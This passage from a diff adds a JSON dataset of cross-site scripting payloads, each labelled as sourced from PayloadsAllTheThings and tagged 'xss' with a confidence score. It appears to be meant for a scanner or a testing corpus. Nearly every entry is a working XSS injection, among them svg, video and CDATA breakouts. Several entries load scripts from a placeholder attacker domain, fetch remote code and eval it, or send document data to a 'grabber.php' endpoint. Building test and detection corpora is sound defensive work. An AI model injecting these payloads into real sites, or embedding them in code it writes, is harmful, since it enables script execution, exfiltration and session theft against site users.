+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg/onload=alert('XSS')>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg onload=alert(1)//",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg id=alert(1) onload=eval(id)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><svg/onload=alert(/XSS/)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><script>alert('33')",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><script>alert&lpar;'33'&rpar;",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<body onload=alert(/XSS/.source)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<video/poster/onerror=alert(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<video><source onerror=\"javascript:alert(1)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<video src=_ onloadstart=\"alert(1)\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<audio src onloadstart=alert(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script src=14.rs>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "data:text/html,<script>alert(0)</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<value><![CDATA[<script>confirm(document.domain)</script>]]></value>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<desc><script>alert('svg desc')</script></desc>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<foreignObject><script>alert('svg foreignObject')</script></foreignObject>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<title><script>alert('svg title')</script></title>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 1');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 2');</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "\"><script src=//[ATTACKER.DOMAIN.TLD]></script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "category": "xss",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.7,
+    "description": "XSS payload line",
+    "tags": [
+      "xss"
+    ]
+  }
+]
